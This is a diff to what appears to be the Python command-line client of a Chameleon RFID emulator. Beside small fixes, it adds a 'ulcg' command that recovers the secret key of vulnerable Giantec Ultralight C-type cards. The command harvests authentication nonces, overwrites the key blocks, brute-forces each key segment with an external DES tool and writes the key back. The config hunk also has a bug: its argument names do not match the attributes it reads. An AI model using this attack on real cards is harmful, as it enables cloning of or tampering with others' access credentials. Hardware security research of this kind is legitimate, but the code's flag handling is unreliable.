@@ -12,6 +12,7 @@ import time
 import serial.tools.list_ports
 import threading
 import struct
+import queue
 from multiprocessing import Pool, cpu_count
 from typing import Union
 from pathlib import Path
@@ -198,7 +199,7 @@ class DeviceRequiredUnit(BaseCLIUnit):
         if ret:
             return True
         else:
-            print("Please connect to chameleon device first(use 'hw connect').")
+            print("Please connect to chameleon device first (use 'hw connect').")
             return False
 
 
@@ -452,6 +453,7 @@ class LFHIDIdArgsUnit(DeviceRequiredUnit):
             HIDFormat.C1K35S: [0xFFF, 0xFFFFF, 0, 0],
             HIDFormat.C15001: [0xFF, 0xFFFF, 0, 0x3FF],
             HIDFormat.S12906: [0xFF, 0xFFFFFF, 0x3, 0],
+            HIDFormat.ACTPHID: [0xFF, 0xFFFFFF, 0, 0x3FF],
             HIDFormat.SIE36: [0x3FFFF, 0xFFFF, 0, 0],
             HIDFormat.H10320: [0, 99999999, 0, 0],
             HIDFormat.H10302: [0, 0x7FFFFFFFF, 0, 0],
@@ -926,7 +928,7 @@ class HFMFNested(ReaderRequiredUnit):
         if block_known == block_target and type_known == type_target:
             print(color_string((CR, "Target key already known")))
             return
-        print(f" - Nested recover one key running...")
+        print(" - Nested recover one key running...")
         key = self.recover_a_key(block_known, type_known, key_known_bytes, block_target, type_target)
         if key is None:
             print(color_string((CY, "No key found, you can retry.")))
@@ -2153,6 +2155,9 @@ class HFMFEConfig(SlotIndexArgsAndGoUnit, HF14AAntiCollArgsUnit, DeviceRequiredU
         log_group = parser.add_mutually_exclusive_group()
         log_group.add_argument('--enable-log', action='store_true', help="Enable logging of MFC authentication data")
         log_group.add_argument('--disable-log', action='store_true', help="Disable logging of MFC authentication data")
+        field_off_reset_group = parser.add_mutually_exclusive_group()
+        field_off_reset_group.add_argument('--enable_field_off_do_reset', action='store_true', help="Enable FIELD_OFF_DO_RESET")
+        field_off_reset_group.add_argument('--disable_field_off_do_reset', action='store_true', help="Disable FIELD_OFF_DO_RESET")
         return parser
 
     def on_exec(self, args: argparse.Namespace):
@@ -2183,6 +2188,8 @@ class HFMFEConfig(SlotIndexArgsAndGoUnit, HF14AAntiCollArgsUnit, DeviceRequiredU
         write_mode = MifareClassicWriteMode(mfc_config["write_mode"])
         detection = mfc_config["detection"]
         change_requested, change_done, uid, atqa, sak, ats = self.update_hf14a_anticoll(args, uid, atqa, sak, ats)
+        field_off_do_reset = self.cmd.mf1_get_field_off_do_reset()
+
         if args.enable_gen1a:
             change_requested = True
             if not gen1a_mode:
@@ -2256,6 +2263,22 @@ class HFMFEConfig(SlotIndexArgsAndGoUnit, HF14AAntiCollArgsUnit, DeviceRequiredU
                 change_done = True
             else:
                 print(f'{color_string((CY, "Requested logging of MFC authentication data already disabled"))}')
+        if args.enable_set_field_off_do_reset:
+            change_requested = True
+            if not field_off_do_reset:
+                field_off_do_reset = True
+                self.cmd.mf1_set_field_off_do_reset(field_off_do_reset)
+                change_done = True
+            else:
+                print(f'{color_string((CY, "Requested FIELD_OFF_DO_RESET already enabled"))}')
+        elif args.disable_set_field_off_do_reset:
+            change_requested = True
+            if field_off_do_reset:
+                field_off_do_reset = False
+                self.cmd.mf1_set_field_off_do_reset(field_off_do_reset)
+                change_done = True
+            else:
+                print(f'{color_string((CY, "Requested FIELD_OFF_DO_RESET already disabled"))}')
 
         if change_done:
             print(' - MF1 Emulator settings updated')
@@ -2282,6 +2305,8 @@ class HFMFEConfig(SlotIndexArgsAndGoUnit, HF14AAntiCollArgsUnit, DeviceRequiredU
                 print(f'- {"Write mode:":40}{color_string((CR, "invalid value!"))}')
             print(
                 f'- {"Log (mfkey32) mode:":40}{f"{enabled_str}" if detection else f"{disabled_str}"}')
+            print(
+                f'- {"FIELD_OFF_DO_RESET:":40}{f"{enabled_str}" if field_off_do_reset else f"{disabled_str}"}')
 
 
 @hf_mfu.command('ercnt')
@@ -2365,7 +2390,7 @@ class HFMFURDPG(MFUAuthArgsUnit):
         else:
             try:
                 self.cmd.hf14a_raw(options=options, resp_timeout_ms=200, data=struct.pack('!BB', 0x30, args.page))
-            except:
+            except (ValueError, chameleon_com.CMDInvalidException, TimeoutError):
                 # we may lose the tag again here
                 pass
             print(color_string((CR, " - Auth failed")))
@@ -2430,7 +2455,7 @@ class HFMFUWRPG(MFUAuthArgsUnit):
             # send a command just to disable the field. use read to avoid corrupting the data
             try:
                 self.cmd.hf14a_raw(options=options, resp_timeout_ms=200, data=struct.pack('!BB', 0x30, args.page))
-            except:
+            except (ValueError, chameleon_com.CMDInvalidException, TimeoutError):
                 # we may lose the tag again here
                 pass
             print(color_string((CR, " - Auth failed")))
@@ -2569,7 +2594,7 @@ class HFMFUESAVE(DeviceRequiredUnit):
                     version = self.cmd.mf0_ntag_get_version_data()
 
                     fd.write(f"# Version: {version.hex()}\n")
-                except:
+                except (ValueError, chameleon_com.CMDInvalidException, TimeoutError):
                     pass  # slot does not have version data
 
                 try:
@@ -2577,7 +2602,7 @@ class HFMFUESAVE(DeviceRequiredUnit):
 
                     if signature != b"\x00" * 32:
                         fd.write(f"# Signature: {signature.hex()}\n")
-                except:
+                except (ValueError, chameleon_com.CMDInvalidException, TimeoutError):
                     pass  # slot does not have signature data
 
             page = 0
@@ -2640,7 +2665,7 @@ class HFMFURCNT(MFUAuthArgsUnit):
         else:
             try:
                 self.cmd.hf14a_raw(options=options, resp_timeout_ms=200, data=struct.pack('!BB', 0x39, args.counter))
-            except:
+            except (ValueError, chameleon_com.CMDInvalidException, TimeoutError):
                 # we may lose the tag again here
                 pass
             print(color_string((CR, " - Auth failed")))
@@ -2697,14 +2722,14 @@ class HFMFUDUMP(MFUAuthArgsUnit):
                 version = self.cmd.hf14a_raw(options=options, resp_timeout_ms=100, data=struct.pack('!B', 0x60))
                 if len(version) == 0:
                     version = None
-            except:
+            except (ValueError, chameleon_com.CMDInvalidException, TimeoutError):
                 version = None
 
             # try sending AUTHENTICATE command and observe the result
             try:
                 supports_auth = len(self.cmd.hf14a_raw(
                     options=options, resp_timeout_ms=100, data=struct.pack('!B', 0x1A))) != 0
-            except:
+            except (ValueError, chameleon_com.CMDInvalidException, TimeoutError):
                 supports_auth = False
 
             if version is not None and not supports_auth:
@@ -2743,7 +2768,7 @@ class HFMFUDUMP(MFUAuthArgsUnit):
 
                     print(color_string((CY, "Tag is likely NTAG 20x, reading until first error.")))
                     stop_page = 256
-                except:
+                except (ValueError, chameleon_com.CMDInvalidException, TimeoutError):
                     # Regular Ultralight
                     tag_name = 'Mifare Ultralight'
                     stop_page = 16
@@ -2793,7 +2818,7 @@ class HFMFUDUMP(MFUAuthArgsUnit):
 
             try:
                 resp = self.cmd.hf14a_raw(options=options, resp_timeout_ms=200, data=struct.pack('!BB', 0x30, i))
-            except:
+            except (ValueError, chameleon_com.CMDInvalidException, TimeoutError):
                 # probably lost tag, but we still need to disable rf field
                 resp = None
 
@@ -2893,6 +2918,457 @@ class HFMFUSIGNATURE(ReaderRequiredUnit):
         print(f" - Data: {resp[:32].hex()}")
 
 
+@hf_mfu.command('authnonce')
+class HFMFUAUTHNONCE(ReaderRequiredUnit):
+    def args_parser(self) -> ArgumentParserNoExit:
+        parser = ArgumentParserNoExit()
+        parser.description = 'Get authentication nonce from MIFARE Ultralight C tag.'
+        return parser
+
+    def on_exec(self, args: argparse.Namespace):
+        options = {
+            'activate_rf_field': 0,
+            'wait_response': 1,
+            'append_crc': 1,
+            'auto_select': 1,
+            'keep_rf_field': 0,
+            'check_response_crc': 1,
+        }
+
+        resp = self.cmd.hf14a_raw(options=options, resp_timeout_ms=200, data=struct.pack('!BB', 0x1A, 0x00))
+        # Response is 0xAF + 8 bytes nonce + 2 bytes CRC = 11 bytes
+        # We want to display just the 8-byte nonce (skip 0xAF prefix)
+        if len(resp) >= 9 and resp[0] == 0xAF:
+            print(f" - Nonce: {resp[1:9].hex()}")
+        else:
+            print(f" - Error: Unexpected response: {resp.hex()}")
+
+
+class CrackEffect:
+    """
+    A class to create a visual effect of cracking blocks of data.
+    """
+
+    def __init__(self, num_blocks: int = 4, block_size: int = 8, scramble_delay: float = 0.01):
+        """
+        Initialize the CrackEffect class with the given parameters.
+
+        Args:
+            num_blocks (int): Number of blocks to display. Default is 4.
+            block_size (int): Size of each block in characters. Default is 8.
+            scramble_delay (float): Delay between each scramble update in seconds. Default is 0.01.
+        """
+        self.num_blocks = num_blocks
+        self.block_size = block_size
+        self.scramble_delay = scramble_delay
+        self.message_queue = queue.Queue()
+        self.revealed = [''] * num_blocks
+        self.stop_event = threading.Event()
+        self.cracked_blocks = set()
+        self.display_lock = threading.Lock()
+        self.output_enabled = True
+
+    def generate_random_hex(self) -> str:
+        """Generate a random hex string of block_size length."""
+        import random
+        hex_chars = '0123456789ABCDEF'
+        return ''.join(random.choice(hex_chars) for _ in range(self.block_size))
+
+    def format_block(self, block: str, is_cracked: bool) -> str:
+        """Format a block with appropriate color based on its state."""
+        if is_cracked:
+            return f"\033[1;34m{block}\033[0m"  # Bold blue
+        return f"\033[96m{block}\033[0m"  # Bright cyan
+
+    def draw_static_box(self):
+        """Draw the initial static box."""
+        if not self.output_enabled:
+            return
+        width = (self.block_size + 1) * self.num_blocks + 4
+        print("")  # Add some padding above
+        print("╔" + "═" * width + "╗")
+        print("║" + " " * width + "║")
+        print("║" + " " * width + "║")
+        print("║" + " " * width + "║")
+        print("╚" + "═" * width + "╝")
+        # Move cursor to the middle line
+        sys.stdout.write("\033[3A")  # Move up 3 lines to middle row
+        sys.stdout.flush()
+
+    def print_above(self, data):
+        """Print the given data above the box and redraws the box."""
+        if not self.output_enabled:
+            print(data)
+            return
+        with self.display_lock:
+            # Move cursor above the box and clean the line
+            sys.stdout.write("\033[2A\033[1G\033[K" + data)
+            self.draw_static_box()
+
+    def display_current_state(self):
+        """Display the current state of all blocks."""
+        if not self.output_enabled:
+            return
+        with self.display_lock:
+            formatted_blocks = [
+                self.format_block(block, i in self.cracked_blocks)
+                for i, block in enumerate(self.revealed)
+            ]
+            display_text = ' '.join(formatted_blocks)
+
+            # Update only the middle line
+            sys.stdout.write(f"\r║  {display_text}   ║")
+            sys.stdout.flush()
+
+    def scramble_effect(self):
+        """Run the main loop for the scrambling effect."""
+        if not self.output_enabled:
+            return
+        while not self.stop_event.is_set():
+            # Update all non-cracked blocks with random values
+            for block in range(self.num_blocks):
+                if block not in self.cracked_blocks:
+                    self.revealed[block] = self.generate_random_hex()
+
+            self.display_current_state()
+            time.sleep(self.scramble_delay)
+
+    def erase_key(self):
+        """Erase random parts of the key."""
+        if not self.output_enabled:
+            return
+        for block in range(self.num_blocks):
+            if block not in self.cracked_blocks:
+                self.revealed[block] = '.' * self.block_size
+        self.display_current_state()
+
+    def process_message_queue(self):
+        """Process incoming cracked blocks from the queue."""
+        if not self.output_enabled:
+            return
+        while not self.stop_event.is_set():
+            try:
+                block_idx, cracked_text = self.message_queue.get(timeout=0.1)
+                self.revealed[block_idx] = cracked_text
+                self.cracked_blocks.add(block_idx)
+                self.display_current_state()
+
+                # Check if all blocks are cracked
+                if len(self.cracked_blocks) == self.num_blocks:
+                    self.stop_event.set()
+                    print("\n" * 3)  # Add newlines after completion
+                    break
+            except queue.Empty:
+                continue
+            except Exception as e:
+                print(f"\nError processing message: {e}")
+                break
+
+    def add_cracked_block(self, block_idx: int, text: str):
+        """Add a cracked block to the message queue."""
+        if not 0 <= block_idx < self.num_blocks:
+            raise ValueError(f"Block index {block_idx} out of range")
+        if len(text) != self.block_size:
+            raise ValueError(f"Block text must be {self.block_size} characters")
+        self.message_queue.put((block_idx, text))
+
+    def start(self):
+        """Start the cracking effect."""
+        self.draw_static_box()
+
+        # Create and start the worker threads
+        scramble_thread = threading.Thread(target=self.scramble_effect)
+        process_thread = threading.Thread(target=self.process_message_queue)
+
+        scramble_thread.daemon = True
+        process_thread.daemon = True
+
+        scramble_thread.start()
+        process_thread.start()
+
+        # Wait for both threads to complete
+        process_thread.join()
+        self.stop_event.set()
+        scramble_thread.join()
+
+
+@hf_mfu.command('ulcg')
+class HFMFUULCG(ReaderRequiredUnit):
+    def args_parser(self) -> ArgumentParserNoExit:
+        parser = ArgumentParserNoExit()
+        parser.description = 'Key recovery for Giantec ULCG and USCUID-UL cards (won\'t work on NXP cards!)'
+        parser.add_argument('-c', '--challenges', type=int, default=1000,
+                          help='Number of challenges to collect (default: 1000)')
+        parser.add_argument('-t', '--threads', type=int, default=1,
+                          help='Number of threads for key recovery (default: 1)')
+        parser.add_argument('-j', '--json', type=str,
+                          help='Path to JSON file to load or save challenges')
+        parser.add_argument('-o', '--offline', action='store_true',
+                          help='Use offline mode with pre-collected challenges')
+        return parser
+
+    def on_exec(self, args: argparse.Namespace):
+        import json
+
+        if not args.offline:
+            challenges = self.collect_challenges(args.challenges)
+            if challenges is None:
+                return
+            if args.json:
+                with open(args.json, "w") as f:
+                    json.dump(challenges, f)
+                print(f"[+] Challenges saved to {args.json}.")
+                print("[!] Beware that the card key is now erased!")
+                return
+        else:
+            if not args.json:
+                print("[-] Error: --json required for offline mode")
+                return
+            with open(args.json, "r") as f:
+                challenges = json.load(f)
+
+        self.crack_key(challenges, args.threads, args.offline)
+
+    def collect_challenges(self, num_challenges):
+        """Collect challenges from the card and check if it is vulnerable."""
+        # Sanity check: make sure an Ultralight C is detected
+        resp = self.cmd.hf14a_scan()
+        if resp is None or len(resp) == 0:
+            print("[-] Error: No tag detected")
+            return None
+
+        # Check SAK for Ultralight C (SAK should be 0x00)
+        print("[+] Checking for Ultralight C...")
+
+        # Check AUTH0 configuration
+        options = {
+            'activate_rf_field': 0,
+            'wait_response': 1,
+            'append_crc': 1,
+            'auto_select': 1,
+            'keep_rf_field': 0,
+            'check_response_crc': 1,
+        }
+
+        # Read page 40-43 (config pages)
+        resp = self.cmd.hf14a_raw(options=options, resp_timeout_ms=200,
+                                 data=struct.pack('!BB', 0x30, 0x28))  # READ page 40
+
+        if len(resp) < 16:
+            print("[-] Error: Card not unlocked. Run relay attack in UNLOCK mode first.")
+            return None
+
+        # Check AUTH0 (should be >= 0x30)
+        minimum_auth_page = resp[8]
+        if minimum_auth_page < 48:
+            print("[-] Error: Card not unlocked. Run relay attack in UNLOCK mode first.")
+            return None
+
+        # Check lock bit
+        is_locked_key = ((resp[1] & 0x80) >> 7) == 1
+        if is_locked_key:
+            print("[-] Error: Card is not vulnerable (key is locked)")
+            return None
+
+        print("[+] All sanity checks \033[1;32mpassed\033[0m. Checking if card is vulnerable.\033[?25l")
+
+        # Collect 100 challenges to check for collision
+        challenges_collected = 0
+        challenges_100 = set()
+        challenges = {}
+        collision = False
+
+        while challenges_collected < num_challenges:
+            resp = self.cmd.hf14a_raw(options=options, resp_timeout_ms=200,
+                                     data=struct.pack('!BB', 0x1A, 0x00))
+            if len(resp) >= 9 and resp[0] == 0xAF:
+                hex_challenge = resp[1:9].hex().upper()
+                if hex_challenge in challenges_100:
+                    collision = True
+                    challenges["challenge_100"] = hex_challenge
+                    break
+                else:
+                    challenges_100.add(hex_challenge)
+                challenges_collected += 1
+
+        print(f"\r[+] Challenges collected: \033[96m{challenges_collected}\033[0m")
+        if collision:
+            print("[+] Status: \033[1;31mVulnerable\033[0m\033[?25h")
+        else:
+            print("[+] Status: \033[1;32mNot vulnerable\033[0m\033[?25h")
+            return None
+
+        # Card is vulnerable, proceed with attack
+        print("[+] Collecting key-specific challenges...")
+
+        # Overwrite block 47 and collect challenge_75
+        self.write_block(47, b'\x00\x00\x00\x00')
+        resp = self.cmd.hf14a_raw(options=options, resp_timeout_ms=200,
+                                 data=struct.pack('!BB', 0x1A, 0x00))
+        if len(resp) >= 9 and resp[0] == 0xAF:
+            challenges["challenge_75"] = resp[1:9].hex().upper()
+        print("[+] 75 collection complete")
+
+        # Overwrite block 46 and collect challenge_50
+        self.write_block(46, b'\x00\x00\x00\x00')
+        resp = self.cmd.hf14a_raw(options=options, resp_timeout_ms=200,
+                                 data=struct.pack('!BB', 0x1A, 0x00))
+        if len(resp) >= 9 and resp[0] == 0xAF:
+            challenges["challenge_50"] = resp[1:9].hex().upper()
+        print("[+] 50 collection complete")
+
+        # Overwrite block 45 and collect challenge_25
+        self.write_block(45, b'\x00\x00\x00\x00')
+        resp = self.cmd.hf14a_raw(options=options, resp_timeout_ms=200,
+                                 data=struct.pack('!BB', 0x1A, 0x00))
+        if len(resp) >= 9 and resp[0] == 0xAF:
+            challenges["challenge_25"] = resp[1:9].hex().upper()
+        print("[+] 25 collection complete")
+
+        # Overwrite block 44 and collect challenge_0
+        self.write_block(44, b'\x00\x00\x00\x00')
+        resp = self.cmd.hf14a_raw(options=options, resp_timeout_ms=200,
+                                 data=struct.pack('!BB', 0x1A, 0x00))
+        if len(resp) >= 9 and resp[0] == 0xAF:
+            challenges["challenge_0"] = resp[1:9].hex().upper()
+        print("[+] 0 collection complete")
+
+        return challenges
+
+    def write_block(self, block, data):
+        """Write a block using hf14a_raw"""
+        options = {
+            'activate_rf_field': 0,
+            'wait_response': 1,
+            'append_crc': 1,
+            'auto_select': 1,
+            'keep_rf_field': 0,
+            'check_response_crc': 1,
+        }
+        # WRITE command (0xA2) + block number + 4 bytes of data
+        cmd_data = struct.pack('!BB4s', 0xA2, block, data)
+        self.cmd.hf14a_raw(options=options, resp_timeout_ms=200, data=cmd_data)
+
+    def crack_key(self, challenges, num_threads, offline):
+        """Crack the key using collected challenges"""
+        import signal
+        import traceback
+
+        key_segment_values = {0: "00"*4, 1: "00"*4, 2: "00"*4, 3: "00"*4}
+        key_found = False
+
+        print("[+] Cracking in progress...\033[?25l")
+
+        # Create and start the cracking effect
+        crack_effect = CrackEffect()
+        effect_thread = threading.Thread(target=crack_effect.start)
+        effect_thread.start()
+
+        def signal_handler(sig, frame):
+            print("\n\n\n[!] Interrupt received, stopping...\033[?25h")
+            crack_effect.stop_event.set()
+            sys.exit(0)
+
+        signal.signal(signal.SIGINT, signal_handler)
+
+        ciphertexts = {1: challenges["challenge_25"],
+                      0: challenges["challenge_50"],
+                      3: challenges["challenge_75"],
+                      2: challenges["challenge_100"]}
+
+        try:
+            for key_segment_idx in [1, 0, 3, 2]:
+                ciphertext = ciphertexts[key_segment_idx]
+
+                cmd = [
+                    str(default_cwd / "mfulc_des_brute"),
+                    "-c",
+                    challenges['challenge_0'],
+                    ciphertext,
+                    "".join(key_segment_values.values()),
+                    str(key_segment_idx + 1),
+                    str(num_threads)
+                ]
+
+                try:
+                    result = subprocess.run(cmd, capture_output=True, text=True, timeout=3600)
+
+                    if "Could not detect LFSR" in result.stderr:
+                        key_found = False
+                        crack_effect.stop_event.set()
+                        crack_effect.erase_key()
+                        print(f"\n\n\n[-] Error: {result.stderr}\033[?25h")
+                        break
+
+                    if "No matching key was found" in result.stdout:
+                        key_found = False
+                        crack_effect.stop_event.set()
+                        crack_effect.erase_key()
+                        print(f"\n\n\n[-] Error: No matching key found for segment {key_segment_idx + 1}\033[?25h")
+                        break
+
+                    if "Full key (hex): " not in result.stdout:
+                        key_found = False
+                        crack_effect.stop_event.set()
+                        crack_effect.erase_key()
+                        print("\n\n\n[-] Error: Unexpected output from mfulc_des_brute\033[?25h")
+                        break
+
+                    # Extract the key segment from output
+                    full_key_line = [line for line in result.stdout.split('\n') if "Full key (hex):" in line][0]
+                    full_key = full_key_line.split("Full key (hex): ")[1].strip()
+                    key_segment_values[key_segment_idx] = full_key[(8*key_segment_idx):][:8]
+                    key_found = True
+                    crack_effect.add_cracked_block(key_segment_idx, key_segment_values[key_segment_idx])
+
+                except subprocess.TimeoutExpired:
+                    key_found = False
+                    crack_effect.stop_event.set()
+                    crack_effect.erase_key()
+                    print(f"\n\n\n[-] Error: Timeout cracking segment {key_segment_idx + 1}\033[?25h")
+                    break
+                except Exception as e:
+                    key_found = False
+                    crack_effect.stop_event.set()
+                    crack_effect.erase_key()
+                    print(f"\n\n\n[-] Error: {e}\033[?25h")
+                    break
+        except Exception as e:
+            crack_effect.stop_event.set()
+            print(f"\n\n\nAn error occurred: {e}\033[?25h")
+            traceback.print_exc()
+        finally:
+            effect_thread.join()
+
+        if key_found:
+            result_key = "".join(key_segment_values.values())
+            formatted_key = f"\033[1;34m{result_key}\033[0m"
+            print(f"[+] Found key: {formatted_key}\033[?25h")
+            if offline:
+                print("You can restore found key on the card with appropriate write commands")
+            else:
+                # Restore the key on the card
+                print("[+] Restoring key to card...")
+                key_bytes = bytes.fromhex(result_key)
+
+                # Need to swap endianness in 8-byte chunks before writing
+                # UL-C stores key with swapped endianness
+                key_swapped = bytearray(16)
+                # Swap first 8 bytes
+                for i in range(8):
+                    key_swapped[i] = key_bytes[7 - i]
+                # Swap second 8 bytes
+                for i in range(8):
+                    key_swapped[8 + i] = key_bytes[15 - i]
+
+                # Write 4 blocks of 4 bytes each
+                for i in range(4):
+                    block = 44 + i
+                    data = bytes(key_swapped[i*4:(i+1)*4])
+                    self.write_block(block, data)
+                print("[+] Key restored on the card")
+
+
 @hf_mfu.command('econfig')
 class HFMFUEConfig(SlotIndexArgsAndGoUnit, HF14AAntiCollArgsUnit, DeviceRequiredUnit):
     def args_parser(self) -> ArgumentParserNoExit:
@@ -2937,7 +3413,7 @@ class HFMFUEConfig(SlotIndexArgsAndGoUnit, HF14AAntiCollArgsUnit, DeviceRequired
 
             try:
                 self.cmd.mf0_ntag_set_version_data(args.set_version)
-            except:
+            except (ValueError, chameleon_com.CMDInvalidException, TimeoutError):
                 print(color_string((CR, "Tag type does not support GET_VERSION command.")))
                 return
 
@@ -2951,7 +3427,7 @@ class HFMFUEConfig(SlotIndexArgsAndGoUnit, HF14AAntiCollArgsUnit, DeviceRequired
 
             try:
                 self.cmd.mf0_ntag_set_signature_data(args.set_signature)
-            except:
+            except (ValueError, chameleon_com.CMDInvalidException, TimeoutError):
                 print(color_string((CR, "Tag type does not support READ_SIG command.")))
                 return
 
@@ -3013,7 +3489,7 @@ class HFMFUEConfig(SlotIndexArgsAndGoUnit, HF14AAntiCollArgsUnit, DeviceRequired
                     write_mode = new_write_mode
                 else:
                     print(color_string((CY, "Requested write mode already set")))
-            except:
+            except (ValueError, chameleon_com.CMDInvalidException, TimeoutError):
                 print(color_string((CR, "Failed to set write mode. Check if device firmware supports this feature.")))
 
         detection = self.cmd.mf0_ntag_get_detection_enable()
@@ -3059,7 +3535,7 @@ class HFMFUEConfig(SlotIndexArgsAndGoUnit, HF14AAntiCollArgsUnit, DeviceRequired
             try:
                 write_mode = MifareUltralightWriteMode(self.cmd.mf0_ntag_get_write_mode())
                 print(f'- {"Write mode:":40}{color_string((CY, write_mode))}')
-            except:
+            except (ValueError, chameleon_com.CMDInvalidException, TimeoutError):
                 # Write mode not supported in current firmware
                 pass
 
@@ -3067,20 +3543,20 @@ class HFMFUEConfig(SlotIndexArgsAndGoUnit, HF14AAntiCollArgsUnit, DeviceRequired
             try:
                 version = self.cmd.mf0_ntag_get_version_data().hex().upper()
                 print(f'- {"Version:":40}{color_string((CY, version))}')
-            except:
+            except (ValueError, chameleon_com.CMDInvalidException, TimeoutError):
                 pass
 
             try:
                 signature = self.cmd.mf0_ntag_get_signature_data().hex().upper()
                 print(f'- {"Signature:":40}{color_string((CY, signature))}')
-            except:
+            except (ValueError, chameleon_com.CMDInvalidException, TimeoutError):
                 pass
 
             try:
                 detection = color_string((CG, "enabled")) if self.cmd.mf0_ntag_get_detection_enable() else color_string((CR, "disabled"))
                 print(
                     f'- {"Log (password) mode:":40}{f"{detection}"}')
-            except:
+            except (ValueError, chameleon_com.CMDInvalidException, TimeoutError):
                 pass
 
 @hf_mfu.command('edetect')
@@ -3135,7 +3611,7 @@ class LFEMRead(ReaderRequiredUnit):
 
     def on_exec(self, args: argparse.Namespace):
         data = self.cmd.em410x_scan()
-        print(color_string((TagSpecificType(data[0])), (CG, data[1].hex())))
+        print(f"{TagSpecificType(data[0])}: {color_string((CG, data[1].hex()))}")
 
 
 @lf_em_410x.command('write')
@@ -3228,23 +3704,19 @@ class LFHIDProxEconfig(SlotIndexArgsAndGoUnit, LFHIDIdArgsUnit):
                 format = HIDFormat[args.format]
             id = struct.pack(">BIBIBH", format.value, args.fc, (args.cn >> 32), args.cn & 0xffffffff, args.il, args.oem)
             self.cmd.hidprox_set_emu_id(id)
-            print(' - Set hidprox tag id success.')
-            fc = args.fc
-            cn = args.cn
-            il = args.il
-            oem = args.oem
+            print(' - SET hidprox tag id success.')
         else:
             (format, fc, cn1, cn2, il, oem) = self.cmd.hidprox_get_emu_id()
             cn = (cn1 << 32) + cn2
-            print(' - Get hidprox tag id success.')
+            print(' - GET hidprox tag id success.')
             print(f" - HIDProx/{HIDFormat(format)}")
-        if fc > 0:
-            print(f"   FC: {color_string((CG, fc))}")
-        if il > 0:
-            print(f"   IL: {color_string((CG, il))}")
-        if oem > 0:
-            print(f"   OEM: {color_string((CG, oem))}")
-        print(f"   CN: {color_string((CG, cn))}")
+            if fc > 0:
+                print(f"   FC: {color_string((CG, fc))}")
+            if il > 0:
+                print(f"   IL: {color_string((CG, il))}")
+            if oem > 0:
+                print(f"   OEM: {color_string((CG, oem))}")
+            print(f"   CN: {color_string((CG, cn))}")
 
 @lf_viking.command('read')
 class LFVikingRead(ReaderRequiredUnit):
@@ -3391,12 +3863,12 @@ class HWSlotList(DeviceRequiredUnit):
                     cn = (cn1 << 32) + cn2
                     print(f"      {'Format:':40}{color_string((CY, HIDFormat(format)))}")
                     if fc > 0:
-                        print(f" FC: {color_string((CG, fc))}")
+                        print(f"      {'FC:':40}{color_string((CG, fc))}")
                     if il > 0:
-                        print(f" IL: {color_string((CG, il))}")
+                        print(f"      {'IL:':40}{color_string((CG, il))}")
                     if oem > 0:
-                        print(f" OEM: {color_string((CG, oem))}")
-                    print(f" CN: {color_string((CG, cn))}")
+                        print(f"      {'OEM:':40}{color_string((CG, oem))}")
+                    print(f"      {'CN:':40}{color_string((CG, cn))}")
                 if lf_tag_type == TagSpecificType.Viking:
                     id = self.cmd.viking_get_emu_id()
                     print(f"      {'ID:':40}{color_string((CY, id.hex().upper()))}")
